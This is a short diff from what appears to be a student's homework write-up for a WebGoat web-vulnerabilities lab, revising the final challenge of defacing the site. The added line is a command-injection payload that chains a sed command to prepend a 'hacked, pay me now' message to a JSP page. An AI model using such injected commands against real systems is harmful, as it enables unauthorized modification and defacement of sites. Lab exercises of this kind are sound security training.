@@ -218,7 +218,7 @@ Your final act is to deface the website using command injection. Follow the walk
 Please include a screenshot of the defaced website. 
 	
      
-      tcp && echo "You've been hacked by Brian" >> sed -i '1s/^/You have been hacked by Brian Williams Pay me now /' /var/lib/tomcat6/webapps/WebGoat/webgoat_challenge_guest.jsp 
+      tcp && sed -i '1s/^/You have been hacked by Brian Williams Pay me now /' /var/lib/tomcat6/webapps/WebGoat/webgoat_challenge_guest.jsp 
       
 ![Image of Challenge3](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/15-Web-Vulnerabilities-and-Hardening%20Homework/images/Challenge333.PNG)
 
